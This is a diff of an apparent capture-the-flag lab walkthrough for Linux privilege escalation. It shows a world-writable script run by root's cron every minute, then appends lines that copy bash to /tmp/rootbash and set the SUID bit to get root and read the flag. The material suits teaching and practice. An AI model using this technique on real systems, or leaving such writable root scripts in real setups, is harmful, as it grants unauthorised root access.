@@ -1,14 +1,37 @@
-# Create a script that root runs every minute
-sudo bash -c 'cat > /opt/backup.sh << EOF
-#!/bin/bash
-# Backup script
-tar -czf /tmp/backup.tar.gz /var/log/*.log
-EOF'
+# Check the cron job exists
+cat /etc/cron.d/backup
+# Output: * * * * * root /opt/backup.sh
 
-sudo chmod 755 /opt/backup.sh
+# Check file permissions (look for 777!)
+ls -la /opt/backup.sh
+# Output: -rwxrwxrwx 1 root root 73 Feb 16 10:00 /opt/backup.sh
+#                      ^^^ world writable = vulnerable!
 
-# Add cron job
-echo "* * * * * root /opt/backup.sh" | sudo tee /etc/cron.d/backup
+# See what the script currently does
+cat /opt/backup.sh
+# Output:
+# #!/bin/bash
+# # Backup script
+# tar -czf /tmp/backup.tar.gz /var/log/*.log
 
-# Make the script writable by everyone (the vulnerability!)
-sudo chmod 777 /opt/backup.sh
+whoami
+# ctfuser
+
+id
+# uid=1001(ctfuser) gid=1001(ctfuser) groups=1001(ctfuser)
+
+# Confirm you can't read the flag yet
+cat /root/flag.txt
+# Permission denied
+
+# Append malicious commands to the script
+echo 'cp /bin/bash /tmp/rootbash' >> /opt/backup.sh
+echo 'chmod u+s /tmp/rootbash' >> /opt/backup.sh
+
+# Verify your injection
+cat /opt/backup.sh
+# #!/bin/bash
+# # Backup script
+# tar -czf /tmp/backup.tar.gz /var/log/*.log
+# cp /bin/bash /tmp/rootbash        <-- your code
+# chmod u+s /tmp/rootbash           <-- your code
